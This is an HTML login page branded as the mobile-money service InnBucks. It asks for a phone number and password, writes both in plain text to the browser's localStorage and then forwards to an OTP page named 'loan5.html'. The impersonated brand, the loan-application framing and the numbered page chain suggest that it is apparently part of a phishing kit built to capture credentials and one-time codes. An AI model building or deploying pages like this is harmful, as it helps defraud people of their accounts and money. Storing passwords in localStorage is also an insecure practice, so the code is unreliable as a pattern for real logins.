<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Login — Continue Application</title>
    <style>
      body {
        margin: 0;
        font-family: Arial, Helvetica, sans-serif;
        background: #f2f2f2;
      }
      .header {
        background: #16213e;
        color: #fff;
        padding: 14px 18px;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .logo {
        font-weight: 700;
      }
      .card {
        max-width: 420px;
        margin: 36px auto;
        background: #fff;
        border-radius: 16px;
        padding: 28px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      }
      h1 {
        margin: 0 0 8px;
        font-size: 20px;
        color: #16213e;
      }
      p {
        color: #666;
        margin-bottom: 18px;
      }
      label {
        display: block;
        font-weight: 600;
        margin-bottom: 6px;
      }
      input {
        width: 100%;
        padding: 12px 14px;
        border-radius: 10px;
        border: 1px solid #ddd;
        margin-bottom: 12px;
      }
      .btn {
        width: 100%;
        padding: 14px;
        border-radius: 12px;
        border: none;
        background: linear-gradient(90deg, #00b894, #6c5ce7);
        color: #fff;
        font-size: 16px;
        cursor: pointer;
      }
      .small {
        font-size: 13px;
        color: #999;
        margin-top: 12px;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="header">
      <div>← Back</div>
      <div class="logo">InnBucks</div>
      <div></div>
    </div>

    <div class="card">
      <h1>Sign in to continue</h1>
      <p>Please confirm your contact to receive an OTP.</p>

      <form id="login1Form">
        <label for="phone">Phone number</label>
        <input id="phone" type="tel" placeholder="+263712345678" required />

        <label for="password">Password</label>
        <input
          id="password"
          type="password"
          placeholder="Enter password"
          required
        />

        <button class="btn" type="submit">Continue</button>
      </form>

      <div class="small">We will send an OTP to verify your phone number.</div>
    </div>

    <script>
      document.getElementById("login1Form").addEventListener("submit", (e) => {
        e.preventDefault();
        const phone = document.getElementById("phone").value.trim();
        const password = document.getElementById("password").value;
        if (!phone) return alert("Please enter your phone number");
        if (!password) return alert("Please enter a password");

        // Save to localStorage so OTP page can use them
        localStorage.setItem("phoneNumber", phone.replace(/\s+/g, ""));
        localStorage.setItem("password", password);

        // Proceed to OTP entry page
        window.location.href = "loan5.html";
      });
    </script>
  </body>
</html>
